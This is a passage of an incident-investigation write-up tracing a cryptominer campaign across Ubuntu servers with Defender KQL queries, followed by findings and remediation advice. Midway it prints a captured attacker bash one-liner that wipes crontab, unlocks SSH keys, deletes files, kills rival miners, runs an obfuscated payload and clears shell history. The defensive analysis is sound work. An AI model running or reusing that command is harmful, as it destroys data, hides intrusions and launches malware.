DeviceNetworkEvents
| where InitiatingProcessCommandLine contains ".bisis"
| summarize IPTargetedCount = count() by bin(Timestamp, 1d), DeviceName
| order by Timestamp desc
```

![image](https://github.com/user-attachments/assets/055b9b78-1356-4acc-85ff-fde3c76b7e70)



Now we need to see what these devices have in common. As we can see, all 6 devices are Linux Ubuntu Servers confirming my initial theory. This common factor can greatly assist us in tracking the malware in the future and back to its origin in our network. 

**Query Used**:
```kql
let CompromisedDevices = dynamic(["linux-programatic-ajs","linux-programatical-vul-remediation-lokesh.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net","sakel-lunix-2","linux-programmatic-vm-danny.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"]);
DeviceInfo
//| where PublicIP == "20.81.228.191"
| where DeviceName in (CompromisedDevices)
| distinct DeviceName, PublicIP, OSPlatform, OSDistribution, DeviceType
```
![image](https://github.com/user-attachments/assets/843fbeaa-4e05-4712-a86b-98cd0ac1ef09)


Investigation of the vm-danny was odd, the device was first seen on Mar 10, 2025 1:57:33 PM and last seen Mar 10, 2025 7:06:53 PM. Initial look into the process table appeared that the device was infected with the same malware before it was first seen as it displayed behavior mid malware execution and persistance. There was no insertion technique to be seen or even any VM configuration from azure on the logs. I'm led to believe that the device was either not logging before the time it was first seen or that attacker had completely botched clearing their tracks only to erase a significant portion of the devices logs. However on the network event side, this device logged 107720 connection requests out with the /var/tmp/.update-logs/.bisis script and 9277 with the /var/tmp/.update-logs/Update script.

Investigation into linux program fix device yielded the same pattern of activity with the exception of a short attempt to brute force the device from an australian IP, 170.64.230.111, as account name backup and proxy until they gained access with root. It may be a coincidence that the logon event at 0551 AM happens to be when the /bin/sh /etc/update-motd.d/90-updates-available recon pattern appears. The log may have been cleaned to cover the point of entry, however it is safe to assume that this IP is associated with the activity based on what comes next. The next series of process events follows the pattern as expected with the exception of /usr/sbin/sshd -D -R from the very same IP to the scp command pulling an executable from the tmp/cache leading to a bash command leading to the creation of the ./MNFleGNm and retea script. The device would then continue to follow the same pattern of activity as seen previously in all areas.

```
bash
bash -c "crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; rm -rf /dev/shm/.x /dev/shm/rete* /var/tmp/payload /tmp/.diicot /tmp/kuak ; chattr -iae /var/tmp/Documents/.diicot ; chattr -iae /var/tmp/.update-logs/History ; chattr -iae /var/tmp/.update-logs/Update ; rm -rf /var/tmp/.update-logs /var/tmp/Documents ; mkdir /var/tmp/Documents > /dev/null 2>&1 ; cd /var/tmp/ ; pkill Opera ; rm -rf /var/tmp/Documents /var/tmp/.update-logs ; rm -rf xmrig  .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/ ; chmod 777 MNFleGNm ; ./MNFleGNm </dev/null &>/dev/null & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
```
![image](https://github.com/user-attachments/assets/32a440fd-9970-4434-aa70-79694a86361c)
![image](https://github.com/user-attachments/assets/c31054ab-c0e8-44e0-9821-a500751a37cd)
![image](https://github.com/user-attachments/assets/eda92468-62ec-4575-b6e6-74476c5e593a)

Based on this deviation from the behavior, it seems that some patterns differ. However we did secure one common pattern and that is the IP address 196.251.73.38 for connection requests for the MNFleGNm file, as we recall is ns1432.ztomy.com located in Amsterdam, the malicious and miner IP. Following this discovery, I queried the network for the remote IP and found four of the six devices in question to have connection requests to obsfucated files or scripts.

![image](https://github.com/user-attachments/assets/cf3d662a-bcaa-4682-9296-24d20ce0a4e6)
![image](https://github.com/user-attachments/assets/b9dee791-6692-4c0a-bfc0-a4ad17df7a3a)

With this I believe we can within a certain margin of error, conclude that this is the most that advanced hunting on MDE will get us. The patterns seem to repeat in a mmaner of the attacker gains access to Linux Ubuntu Servers, somehow runs a legitmate MOTD to begin the recon chain and perhaps file creation, leading to another login that pushes a scp command to begin the attack chain. The question now is how did this malware proliferate among the network, my theory is the .x/network script that probes the internal network once from the infected devices. This would allow a script to attempt to gain access to misconfigured devices as the cyber range conducts labs that intentionally misconfigure devices.

The question on our minds now would be "What was the first machine to have this malware in the network?", with MDE Device Invetory and MDE Incidents, we see that the first machine to run a retea script is linuxprogramfixjay on January 9th at 0639 AM, following the same set of patterns observed on the linux program fix device with a slight change to the order of operations. Where retea is initially executed without an obsfucated file to initiate, now it seems to rely on executing retea after running a obsfucated script.

![image](https://github.com/user-attachments/assets/1a3efa81-3ac0-4893-85a0-53b684aa630b)
![image](https://github.com/user-attachments/assets/11eaa508-7f68-4b6e-8f27-e960e670dd8d)


## Summary of Findings

### **Validated Brute-Force Allegation:**

**Source Confirmation:** The reported public IP was confirmed to belong to our Azure environment.

**Attack Pattern:** Analysis of logon events revealed over 100 failed SSH attempts from an external malicious IP (8.219.145.111) targeting the Linux host, with a clear brute-force attack pattern on the root account.

**Compromised Linux Host** – sakel-lunix-2:

**Unauthorized Account Creation:** Evidence of account creation (e.g., testuser without a proper password) suggests an attempt to facilitate lateral movement or testing.

### **Suspicious Process Activity:**

Unusual process commands were noted, including modifications to the Message-of-the-Day (MOTD) scripts—potentially to establish persistence or to execute malicious payloads at each login.

Discovery of an obfuscated executable (./UpzBUBnv) with a known malicious SHA256 hash indicates a likely cryptomining payload and concurrent efforts to disable competing processes.

### **Service and Cron Manipulation:**

The installation of a custom systemctl service (myservice) and multiple cron jobs ensures the malware’s persistence across reboots.

Commands show evidence of log tampering and efforts to hide malicious activities (e.g., deletion of logs, obfuscated file names, and manipulation of SSH keys).

### Malware Capabilities and Lateral Movement:

**Remote Payloads and Data Exfiltration:**

Use of wget/curl commands to download further payloads from suspicious domains.

Continuous exfiltration activity noted (approximately 162 MB of data over multiple sessions) aimed at bypassing detection.

### Network Scanning and Reconnaissance:

The malware exhibits lateral movement capabilities, as seen by its internal network scans and SSH brute-force attempts.

Multiple Ubuntu servers in the network display similar infection patterns, suggesting a broader compromise.

### Initial Infection Point:

Historical data suggests the first execution of the related retea script occurred on the device “linuxprogramfixjay” as early as January 9th, pointing to a possible origin for the spread.


## Actions To Take

### Immediate Isolation & Containment:

Isolate affected Linux servers from the network to prevent further lateral movement.

Block malicious IP addresses (e.g., 8.219.145.111, 196.251.73.38, and others flagged in the report) at the perimeter firewall.

### Eradication and System Remediation:

Identify and remove all malicious files, unauthorized user accounts, and rogue services (e.g., ssshd, myservice) from the affected systems.

Review and clean up cron jobs and scheduled tasks that may have been modified for persistence.

Re-image or patch systems if removal is incomplete or integrity is in question.

### Credential and Access Management:

Rotate all credentials and SSH keys across the affected environment.

Audit and reinforce multi-factor authentication (MFA) for all administrative accounts.

### Enhanced Monitoring and Forensic Analysis:

Deploy enhanced logging and continuous monitoring on endpoints to detect similar activities.

Extend retention policies for advanced threat hunting with Microsoft Defender for Endpoint (MDE) to capture a longer timeline of activities.

Perform a network-wide scan using KQL queries to identify additional hosts exhibiting similar malicious behaviors.

### Incident Response and Communication:

Engage the incident response team to conduct a full forensic analysis, particularly focusing on lateral movement patterns.

Notify internal stakeholders and update the Azure Safeguards Team with the latest findings and remediation plans.

Consider sharing anonymized threat intelligence with industry partners to warn of the observed tactics.

### Review and Harden Security Posture:

Audit system configurations, especially for SSH and scheduled tasks, to ensure compliance with security best practices.

Implement segmentation controls to limit lateral movement between critical assets and non-critical devices.

Review and update security policies to cover similar attack vectors in the future.

